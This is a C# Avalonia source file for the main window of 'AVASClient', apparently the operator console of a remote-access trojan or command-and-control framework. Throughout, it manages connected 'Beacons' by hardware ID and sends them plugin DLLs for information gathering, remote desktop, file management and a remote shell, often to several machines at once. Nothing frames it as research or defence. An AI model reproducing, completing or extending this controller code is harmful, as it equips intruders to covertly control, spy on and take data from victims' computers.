using Avalonia;
using Avalonia.Controls;
using Avalonia.Controls.Notifications;
using Avalonia.Controls.Primitives;
using Avalonia.Styling;
using Avalonia.Themes.Fluent;
using AVASClient.Helper;
using AVASClient.MessagePackLib;
using AVASClient.Models;
using AVASClient.Services;
using AVASClient.ViewModels;
using DataList.Beacon.Models;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace AVASClient
{
    public partial class MainWindow : Window
    {

        public MainWindow()
        {
            InitializeComponent();

            // 创建日志视图模型
            Settings._logViewModel = new LogViewModel();
            //Settings.BID = Guid.NewGuid().ToString();
            // 设置数据上下文
            DataContext = new MainWindowViewModel
            {
                Beacons = MainWindowModle.Beacons,
                LogViewModel = Settings._logViewModel
            };

            // 初始化日志
            LogService.Instance.Info("MainWindow initialized", "MainWindow");
            
            // 自动连接服务器
            _ = AutoConnectToServer();
        }

        private async Task AutoConnectToServer()
        {
            try
            {
                // 检查是否已有连接
                if (Settings.client != null && Settings.client.IsConnected)
                {
                    LogService.Instance.Info("使用现有服务器连接", "MainWindow");
                    return;
                }

                // 尝试连接默认服务器
                if (!string.IsNullOrEmpty(Settings.ServerAddress) && Settings.ServerPort > 0)
                {
                    LogService.Instance.Info($"尝试连接到服务器 {Settings.ServerAddress}:{Settings.ServerPort}", "MainWindow");
                    
                    Settings.client = new Client();
                    bool connected = await Task.Run(() => Settings.client.Connect(Settings.ServerAddress, Settings.ServerPort));
                    
                    if (connected)
                    {
                        LogService.Instance.Info("自动连接服务器成功", "MainWindow");
                    }
                    else
                    {
                        LogService.Instance.Warning("自动连接服务器失败", "MainWindow");
                        Settings.client = null;
                    }
                }
                else
                {
                    LogService.Instance.Info("未配置服务器地址，请手动连接", "MainWindow");
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Error($"自动连接服务器时发生异常: {ex.Message}", "MainWindow", ex);
                Settings.client = null;
            }
        }

        //获取dataGrid所有选中的行
        public string GetSelectedBeacons()
        {

            var selectedBeacons = new List<BeaconInfo>();
            List<string> strings = new List<string>();
            foreach (var item in BeaconDataGrid.SelectedItems)
            {
                if (item is BeaconInfo beacon)
                {
                    strings.Add(beacon.Id);
                }
            }
            string result = string.Join("|", strings);
            return result;
        }
        protected override void OnApplyTemplate(TemplateAppliedEventArgs e)
        {
            base.OnApplyTemplate(e);
            Settings._manager = new WindowNotificationManager(this) { MaxItems = 3 };
        }
        private void SwitchTheme_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            // Avalonia 11: 使用 ThemeVariant 切换主题
            var app = Application.Current;
            if (app != null)
            {
                app.RequestedThemeVariant = app.RequestedThemeVariant == ThemeVariant.Dark
                    ? ThemeVariant.Light
                    : ThemeVariant.Dark;
            }
        }
        private void MenuItem_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            LogService.Instance.Info("用户点击了测试菜单项", "MainWindow");

            if (Settings.client != null)
            {
                try
                {
                    using (var mp = new ClientMsgPack())
                    {
                        mp.ForcePathObject("Pac_ket").SetAsString("GetBeaconList");
                        Settings.client.SendFramed(mp.Encode2Bytes());
                    }
                    LogService.Instance.Info("成功发送GetBeaconList请求", "MainWindow");
                }
                catch (Exception ex)
                {
                    LogService.Instance.Error("发送GetBeaconList请求失败", "MainWindow", ex);
                    Settings._manager?.Show(new Notification("错误", "发送请求时发生异常。", NotificationType.Error));
                }
            }
            else
            {
                LogService.Instance.Warning("未连接到服务器，无法发送请求", "MainWindow");
                Settings._manager?.Show(new Notification("错误", "未连接到服务器，无法发送请求。", NotificationType.Error));
            }
        }

        private void MenuItem_Click_1(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            LogService.Instance.Info("用户点击了服务器设置菜单项", "MainWindow");
            var settingsWindow = new ServerSettings();
            settingsWindow.ShowDialog(this);
        }

        private void MenuItem_Click_2(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            LogService.Instance.Info("用户点击了生成测试数据菜单项", "MainWindow");
            try
            {
                MainWindowModle.Beacons.Add(new BeaconInfo
                {
                    Id = "New Client",
                    ListenerId = "TCP",
                    IPAddress = "本机",
                    IPProt = "127.0.0.1:8888",
                    ConnectedTime = DateTime.Now,
                    LastSeenTime = DateTime.Now,
                });
                LogService.Instance.Info("成功添加测试Beacon数据", "MainWindow");
            }
            catch (Exception ex)
            {
                LogService.Instance.Error("添加测试Beacon数据失败", "MainWindow", ex);
            }
        }

        private async void ChangeGroup_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                var selectedBeaconsid = GetSelectedBeacons();

                if (!string.IsNullOrEmpty(selectedBeaconsid))
                {
                    // 创建输入对话框
                    var inputDialog = new InputDialog
                    {
                        DialogTitle = "更改备注",
                        Message = $"请输入新的备注信息",
                        InputText = ""
                    };

                    var result = await inputDialog.ShowDialog<bool>(this);
                    if (result)
                    {
                        ClientMsgPack clientMsgPack = new ClientMsgPack();
                        clientMsgPack.ForcePathObject("Pac_ket").SetAsString("updateGroup");        // 消息类型
                        clientMsgPack.ForcePathObject("Group").SetAsString(inputDialog.InputText?.Trim() ?? ""); // 新分组名
                        clientMsgPack.ForcePathObject("BID").SetAsString(selectedBeaconsid);  // 多个ID用|分隔

                        // 修复：使用 lambda 包装 SendFramed 以匹配 WaitCallback 委托签名
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
                        });
                    }
                    else
                    {
                        Settings._manager?.Show(new Notification("提示", "操作已取消", NotificationType.Warning));
                    }

                }
                else
                {
                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Error("更改分组时发生异常", "MainWindow", ex);
                Settings._manager?.Show(new Notification("错误", "更改分组时发生异常", NotificationType.Error));
            }
        }

        private async void ChangeNotes_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                // 获取选中的 Beacon
                var dataGrid = this.FindControl<DataGrid>("BeaconDataGrid");
                if (dataGrid?.SelectedItem is BeaconInfo selectedBeacon)
                {
                    LogService.Instance.Info($"用户请求更改 Beacon 备注: {selectedBeacon.IPProt}", "MainWindow");

                    // 创建输入对话框
                    var inputDialog = new InputDialog
                    {
                        DialogTitle = "更改备注",
                        Message = $"请输入新的备注信息 (当前: {selectedBeacon.Notes ?? "无"})",
                        InputText = selectedBeacon.Notes ?? ""
                    };

                    var result = await inputDialog.ShowDialog<bool>(this);
                    if (result)
                    {
                        string newNotes = inputDialog.InputText?.Trim() ?? "";
                        selectedBeacon.Notes = newNotes;
                        LogService.Instance.Info($"Beacon {selectedBeacon.IPProt} 备注已更改为: {newNotes}", "MainWindow");

                        Settings._manager?.Show(new Notification("成功", $"备注已更改为: {newNotes}", NotificationType.Success));
                    }
                }
                else
                {
                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Error("更改备注时发生异常", "MainWindow", ex);
                Settings._manager?.Show(new Notification("错误", "更改备注时发生异常", NotificationType.Error));
            }
        }
        private void Fetch_information_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                // 获取选中的 Beacon
                var selectedBeaconsid = GetSelectedBeacons();
                if (!string.IsNullOrEmpty(selectedBeaconsid))
                {
                    string dllPath = Path.Combine(AppContext.BaseDirectory, "Plugins", "Information.dll");
                    ClientMsgPack packet = new ClientMsgPack();                                 //子
                    packet.ForcePathObject("Pac_ket").AsString = "information";

                    ClientMsgPack msgpack = new ClientMsgPack();                                //父
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(dllPath));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    msgpack.ForcePathObject("DLLINFO").SetAsString("Information");
                    msgpack.ForcePathObject("BID").SetAsString(selectedBeaconsid);  // 多个ID用|分隔
                    ThreadPool.QueueUserWorkItem(state =>
                    {
                        Settings.client?.SendFramed(msgpack.Encode2Bytes());
                    });
                }
                else
                {
                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }

            }
            catch (Exception ex)
            {
                LogService.Instance.Error($"请求信息时发生异常:{ex}", "MainWindow", ex);
                return;
            }
        }
        private async void RemoteDesktop_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                //插件路径
                string dllPath = Path.Combine(AppContext.BaseDirectory, "Plugins", "RemoteDesktop.dll");
                //封装消息
                ClientMsgPack msgpack = new ClientMsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(dllPath));

                // 获取选中的 Beacon
                var selectedBeaconsid = GetSelectedBeacons();
                if (!string.IsNullOrEmpty(selectedBeaconsid))
                {
                    msgpack.ForcePathObject("BID").SetAsString(selectedBeaconsid);  // 多个ID用|分隔
                    string[] BeaconIdArray = selectedBeaconsid.Split('|', StringSplitOptions.RemoveEmptyEntries);//这就是所有的要控制的 Beacon ID

                    foreach (string BID in BeaconIdArray)
                    {

                        //使用ID去获取HWID
                        var beacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == BID);
                        if (beacon == null)
                        {
                            LogService.Instance.Error($"未找到ID为{BID}的Beacon，无法获取HWID", "MainWindow");
                            continue;
                        }
                        string HWID = beacon.HWID;

                        //拼接窗口Name："RemoteDesktop:" + id
                        string windowName = "RemoteDesktop:" + BID;
                        Window window = await Helper.FindForm.FindWindowByNameSafe(windowName);
                        if (window != null)
                        {
                            window.Activate();//如果窗口已经打开，就激活它
                            return;
                        }
                        //拼接窗口标题："RemoteDesktop:" + HWID
                        Form_RemoteDesktop remoteDesktop = new Form_RemoteDesktop(BID)
                        {
                            Title = "RemoteDesktop:" + HWID,
                        };

                        // 使用 Tag 属性来存储窗口标识，避免 Name 属性冲突
                        remoteDesktop.Tag = windowName;
                        remoteDesktop.Show();
                    }
                    ThreadPool.QueueUserWorkItem(state =>
                    {
                        Settings.client?.SendFramed(msgpack.Encode2Bytes());
                    });

                }
                else
                {

                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }


            }
            catch (Exception ex)
            {
                LogService.Instance.Error(ex.Message, "MainWindow");
                Settings._manager?.Show(new Notification("错误", $"打开远程桌面时发生异常:{ex.Message}", NotificationType.Error));
                return;
            }
        }

        private async void FileManager_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                string dllPath = Path.Combine(AppContext.BaseDirectory, "Plugins", "FileManager.dll");
                ClientMsgPack clientMsgPack = new ClientMsgPack();
                clientMsgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                clientMsgPack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(dllPath));

                // 获取选中的 Beacon
                var selectedBeaconsid = GetSelectedBeacons();
                if (!string.IsNullOrEmpty(selectedBeaconsid))
                {
                    clientMsgPack.ForcePathObject("BID").SetAsString(selectedBeaconsid);  // 多个ID用|分隔
                    string[] BeaconIdArray = selectedBeaconsid.Split('|', StringSplitOptions.RemoveEmptyEntries);//这就是所有的要控制的 Beacon ID


                    foreach (string BID in BeaconIdArray)
                    {


                        //使用ID去获取HWID
                        var beacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == BID);
                        if (beacon == null)
                        {
                            LogService.Instance.Error($"未找到ID为{BID}的Beacon，无法获取HWID", "MainWindow");
                            continue;
                        }
                        string HWID = beacon.HWID;

                        //拼接窗口Name："RemoteDesktop:" + id
                        string windowName = "FileManager:" + BID;
                        Window window = await Helper.FindForm.FindWindowByNameSafe(windowName);
                        if (window != null)
                        {
                            window.Activate();//如果窗口已经打开，就激活它
                            return;
                        }
                        //拼接窗口标题："RemoteDesktop:" + HWID
                        Form_FileManager fileManager = new Form_FileManager(BID)
                        {
                            Title = "FileManager:" + HWID,
                        };

                        // 使用 Tag 属性来存储窗口标识，避免 Name 属性冲突
                        fileManager.Tag = windowName;
                        fileManager.Show();
                    }
                    ThreadPool.QueueUserWorkItem(state =>
                    {
                        Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
                    });
                }
                else
                {
                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                LogService.Instance.Error(ex.Message, "MainWindow");
                return;
            }

        }
        private async void RemoteShell_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            try
            {
                string dllPath = Path.Combine(AppContext.BaseDirectory, "Plugins", "Shell.dll");
                ClientMsgPack clientMsgPack = new ClientMsgPack();
                clientMsgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                clientMsgPack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(dllPath));

                // 获取选中的 Beacon
                var selectedBeaconsid = GetSelectedBeacons();
                if (!string.IsNullOrEmpty(selectedBeaconsid))
                {
                    clientMsgPack.ForcePathObject("BID").SetAsString(selectedBeaconsid);  // 多个ID用|分隔
                    string[] BeaconIdArray = selectedBeaconsid.Split('|', StringSplitOptions.RemoveEmptyEntries);//这就是所有的要控制的 Beacon ID


                    foreach (string BID in BeaconIdArray)
                    {


                        //使用ID去获取HWID
                        var beacon = MainWindowModle.Beacons.FirstOrDefault(b => b.Id == BID);
                        if (beacon == null)
                        {
                            LogService.Instance.Error($"未找到ID为{BID}的Beacon，无法获取HWID", "MainWindow");
                            continue;
                        }
                        string HWID = beacon.HWID;

                        //拼接窗口Name："RemoteDesktop:" + id
                        string windowName = "Shell:" + BID;
                        Window window = await Helper.FindForm.FindWindowByNameSafe(windowName);
                        if (window != null)
                        {
                            window.Activate();//如果窗口已经打开，就激活它
                            return;
                        }
                        //拼接窗口标题："RemoteDesktop:" + HWID
                        Form_Shell form = new Form_Shell(BID)
                        {
                            Title = "Shell:" + HWID,
                        };

                        // 使用 Tag 属性来存储窗口标识，避免 Name 属性冲突
                        form.Tag = windowName;
                        form.Show();
                    }
                    ThreadPool.QueueUserWorkItem(state =>
                    {
                        Settings.client?.SendFramed(clientMsgPack.Encode2Bytes());
                    });
                }
                else
                {
                    Settings._manager?.Show(new Notification("提示", "请先选择一个 Beacon", NotificationType.Warning));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                LogService.Instance.Error(ex.Message, "MainWindow");
                return;
            }

        }



    }




}